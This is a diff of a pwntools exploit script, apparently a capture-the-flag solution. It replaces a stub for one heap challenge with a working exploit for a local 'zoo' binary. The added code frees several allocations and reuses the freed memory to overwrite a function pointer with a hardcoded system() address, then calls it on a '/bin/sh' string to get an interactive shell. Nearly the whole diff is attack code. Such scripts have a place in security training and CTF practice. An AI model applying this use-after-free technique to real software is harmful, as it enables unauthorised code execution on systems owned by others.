@@ -24,57 +24,52 @@ def debug(breakpoint=''):
     gdbscript += 'directory %slibio/\n' % glibc_dir
     gdbscript += 'directory %self/\n' % glibc_dir
     gdbscript += 'set follow-fork-mode parent\n'
-    gdbscript += 'set resolve-heap-via-heuristic on\n'
     elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
     gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
     gdb.attach(p, gdbscript)
     time.sleep(1)
 
-elf = ELF("./MercuryBlast")
-libc = ELF("./libc-2.31.so")
-context(arch = elf.arch ,log_level = 'debug', os = 'linux')
+elf = ELF('./zoo')
+context(arch = elf.arch ,log_level = 'debug', os = 'linux',terminal = ['tmux', 'splitw', '-hp','62'])
 
-def add_record(temp, size, data):
-    sla("Your choice: ", "1")
-    sla("Input Temperature:", str(temp))
-    sla("Input Description Size: ", str(size))
-    sa("Input Description: ", data)
+def add_animal(name):
+    sla("> ", "1")
+    sla("2) Panda", "1")
+    sa("Name of animal?", name)
 
-def print_record():
-    sla("Your choice: ", "2")
-    # sla("Input Index:", str(idx))
+def remove_animal(idx):
+    sla("> ", "2")
+    sla("Zone number? (0-9)", str(idx))
 
-def delete_record(idx):
-    sla("Your choice: ", "3")
-    sla("Input Index:", str(idx))   
-
-def edit_record(idx, temp, size, data):
-    sla("Your choice: ", "4")
-    sla("Input index: ", str(idx))
-    sla("Input Temperature:", str(temp))
-    sla("Input Description Size: ", str(size))
-    sa("Input Description: ", data)
-
-def blast(data):
-    sla("Your choice: ", str('\x7f'))
-    se(data)
-
-read_bp = 0x167a
-
-def exp1():
-    add_record(1, 0x200, b'AAAAAAAA')
-    debug('''
-    b * delete_record
-    b * delete_record+63
-    ''')
-    delete_record(0)
-    p.interactive()
+def report_name(idx):
+    sla("> ", "3")
+    sla("Zone number? (0-9)", str(idx))
 
 
-def exp2():
-    p.interactive()
+p = process("./zoo")
 
-    
-p = process("./MercuryBlast")
-exp1()
-# exp2()
+add_animal("a" * 0x18) #0
+add_animal("/bin/sh;/bin/sh;/bin/sh\x00") #1
+add_animal("b" * 0x18) #2
+add_animal("b" * 0x18) #3
+
+remove_animal(0)
+remove_animal(1)
+remove_animal(2)
+remove_animal(3)
+
+sys_addr = 0x401120
+add_animal(p64(sys_addr) + b"a" * 8 + b'\x10') #0
+
+# debug()
+report_name(2)
+
+
+# get_shell_addr = 0x401276
+# add_animal(0x10, p64(get_shell_addr)) #0
+# debug()
+
+
+p.interactive()
+
+
